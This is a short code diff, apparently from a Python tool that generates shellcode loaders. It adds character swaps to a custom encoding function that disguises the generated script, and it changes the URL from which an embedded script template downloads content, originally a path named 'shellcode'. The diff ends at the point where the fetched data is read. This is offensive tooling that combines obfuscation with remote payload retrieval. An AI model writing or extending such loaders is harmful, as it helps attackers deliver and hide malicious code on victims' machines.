@@ -1,6 +1,6 @@
 def custom_encode(data):
    
-    char_mapping = {'a': 'd', 'd': 'a', 'k': 'L', 'L': 'k', ')': 'n','n': ')'}  
+    char_mapping = {'a': 'd', 'd': 'a', 'k': 'L', 'L': 'k', ')': 'n','n': ')','P':'u','u':'P'}  
     
     encoded_data = ""
     for char in data:
@@ -12,7 +12,7 @@ def custom_encode(data):
 
 
 script = f"""
-static_url = "http://127.0.0.1:8080/download/shellcode"
+static_url = "http://127.0.0.1/"
 rs = rr.get(static_url)
 if rs.status_code == 200:
     data = rs.content
